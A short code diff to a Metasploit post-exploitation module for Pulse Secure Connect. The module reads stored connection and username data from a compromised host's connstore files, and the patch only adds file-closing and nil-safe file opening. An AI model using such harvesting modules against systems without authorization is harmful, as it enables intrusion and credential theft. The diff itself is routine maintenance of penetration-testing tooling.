@@ -117,6 +117,7 @@ class MetasploitModule < Msf::Post
         next if connstore_file.nil?
 
         connstore_data = connstore_file.read.to_s
+        connstore_file.close
         matches = connstore_data.scan(/ive "([a-z0-9]*)" {.*?connection-source: "([^"]*)".*?friendly-name: "([^"]*)".*?uri: "([^"]*)".*?}/m)
         matches.each do |m|
           ives[m[0]] = {}
@@ -154,8 +155,11 @@ class MetasploitModule < Msf::Post
       return unless is_system?
       paths.each do |path|
         next unless session.fs.file.exist?(path)
+        connstore_file = session.fs.file.open(path) rescue nil
+        next if connstore_file.nil?
+        connstore_data = connstore_file.read.to_s
+        connstore_file.close
 
-        connstore_data = session.fs.file.open(path).read.to_s
         matches = connstore_data.scan(/userdata "([a-z0-9]*)" {.*?username: "([^"]*)".*?}/m)
         matches.each do |m|
           if m[0] == ive_index
@@ -339,6 +343,7 @@ class MetasploitModule < Msf::Post
         return Msf::Exploit::CheckCode::Unknown
       end
       version_data = version_file.read.to_s
+      version_file.close
       matches = version_data.scan(/DisplayVersion=([0-9.]+)/m)
       build = Gem::Version.new(matches[0][0])
       print_status("Target is running Pulse Secure Connect build #{build}.")
